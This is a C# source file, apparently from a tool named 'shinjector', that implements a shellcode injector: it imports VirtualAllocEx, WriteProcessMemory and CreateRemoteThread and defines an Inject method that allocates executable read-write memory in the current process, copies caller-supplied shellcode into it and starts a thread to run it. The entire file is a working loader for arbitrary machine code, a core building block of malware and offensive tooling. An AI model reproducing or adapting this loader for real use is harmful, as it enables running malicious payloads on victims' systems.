using System;
using System.Runtime.InteropServices;

namespace shinjector.Casos
{
    class PInvoke
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, 
            IntPtr lpAddress, 
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, 
            IntPtr lpBaseAddress, 
            byte[] lpBuffer, 
            uint nSize, 
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes, 
            uint dwStackSize, 
            IntPtr lpStartAddress,
            IntPtr lpParameter, 
            uint dwCreationFlags, 
            out IntPtr lpThreadId);

        public static void Inject(byte[] shellcode)
        {
            IntPtr baseAddress = VirtualAllocEx((IntPtr)(-1), IntPtr.Zero, (uint)shellcode.Length, 0x00002000 | 0x00001000, 0x40);

            if (baseAddress == IntPtr.Zero)
                return;

            bool r = WriteProcessMemory((IntPtr)(-1), baseAddress, shellcode, (uint)shellcode.Length, out var _);

            if (r == false)
                return;

            IntPtr hthread = CreateRemoteThread((IntPtr)(-1), IntPtr.Zero, 0, baseAddress, IntPtr.Zero, (uint)0, out var _);

        }

    }
}
